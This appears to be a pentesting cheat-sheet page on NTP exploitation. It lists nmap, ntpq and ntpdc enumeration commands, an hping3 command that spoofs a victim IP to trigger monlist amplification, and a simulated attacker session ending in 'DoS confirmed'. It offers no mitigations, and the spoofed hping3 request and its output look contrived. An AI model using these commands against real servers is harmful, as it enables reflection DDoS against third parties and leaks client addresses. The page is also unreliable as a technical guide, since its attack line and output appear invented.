<!-- Title -->
<h1 class="text-2xl font-bold mb-2">NTP Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>NTP Abuse & Amplification Attacks</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    NTP (Network Time Protocol) synchronizes system clocks across networks. 
    Attackers exploit NTP for information disclosure (version, peers, clients), 
    amplification/reflection DDoS, and reconnaissance of network infrastructure. 
    Misconfigured NTP servers exposing legacy commands like <code>monlist</code> 
    enable attackers to retrieve lists of connected clients and launch massive 
    volumetric attacks. NTP-based reflection/amplification attacks have been 
    used in some of the largest DDoS campaigns.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Unauthenticated Protocol:</strong> NTP responds to any request.</li>
    <li><strong>Amplification Factor:</strong> Small queries → huge responses (reflection DDoS).</li>
    <li><strong>Legacy Commands:</strong> <code>monlist</code> leaks recent clients.</li>
    <li><strong>Recon Potential:</strong> Time skew can fingerprint OS/VMs.</li>
    <li><strong>Poor Monitoring:</strong> NTP traffic often ignored by defenders.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify NTP servers on UDP/123.</li>
    <li><strong>Enumeration:</strong> Query server for version, peers, clients.</li>
    <li><strong>Amplification:</strong> Send spoofed requests to flood victim with responses.</li>
    <li><strong>Reconnaissance:</strong> Use time leaks and peer info to map infrastructure.</li>
    <li><strong>Impact:</strong> Large-scale DDoS, client IP disclosure, OS fingerprinting.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan for open NTP services on UDP/123.</li>
    <li>Enumerate server details and check for <code>monlist</code> or <code>ntpdc</code> responses.</li>
    <li>Leverage NTP info for reconnaissance (OS, uptime, peers).</li>
    <li>Exploit for amplification DDoS via spoofed requests.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -sU -p123 --script ntp-info [target]       # Enumerate NTP server
nmap -sU -p123 --script ntp-monlist [target]   # Check for monlist support

# ------------------------------
# Enumeration
# ------------------------------
ntpq -c version -n [target]                    # Check NTP version
ntpq -c peers [target]                         # List NTP peers
ntpq -c readlist [target]                      # Dump variables
ntpdc -c monlist [target]                      # Legacy: list last 600 clients

# ------------------------------
# Amplification / Reflection (spoofed source)
# ------------------------------
hping3 -2 -s 123 -a [victim_IP] -p 123 [target] \
--sign "monlist"                               # Spoofed attack request

# ------------------------------
# Example Workflow
# ------------------------------
nmap -sU -p123 --script ntp-info 192.168.1.50
ntpq -c peers 192.168.1.50
ntpdc -c monlist 192.168.1.50
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -sU -p123 --script ntp-info 192.168.1.50
PORT    STATE SERVICE
123/udp open  ntp
| ntp-info: 
|   version: ntpd 4.2.8p10
|   processor: x86_64, Linux
|_  system: Linux server01 5.10.0-20-amd64

[ saide ~ ]$ ntpq -c peers 192.168.1.50
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
+time1.google.com .GOOG.          1 u  234 1024  377   25.123   -0.123   0.456
+time2.google.com .GOOG.          1 u  234 1024  377   25.456   -0.321   0.789

[ saide ~ ]$ ntpdc -c monlist 192.168.1.50
remote address          count   m ver rstr avgint  lstint
---------------------------------------------------------
192.168.1.101           35      3  4    400    32     8
192.168.1.102           10      3  4    400    64    12
192.168.1.150           5       3  4    400   128    20

[ saide ~ ]$ hping3 -2 -s 123 -a 10.0.0.99 -p 123 192.168.1.50 --sign "monlist"
[*] Sending spoofed NTP request
[*] Victim (10.0.0.99) now flooded with amplified monlist responses
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample NTP exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# NTP Server Info
version: ntpd 4.2.8p10
system: Linux server01 5.10.0-20-amd64

# Peers
time1.google.com
time2.google.com

# Monlist Output (client IP leakage)
192.168.1.101
192.168.1.102
192.168.1.150

# Amplification Attack
Request size: 64 bytes
Response size: 4,680 bytes
Amplification factor: ~73x
Victim IP: 10.0.0.99 → DoS confirmed
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting NTP
      </a>
    </li>
    <li>
      <a href="https://www.us-cert.cisa.gov/ncas/alerts/TA14-013A" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        US-CERT Alert – NTP Amplification DDoS Attacks
      </a>
    </li>
    <li>Classic Red Team usage: NTP enumeration → Client leak → DDoS amplification.</li>
  </ul>
</section>
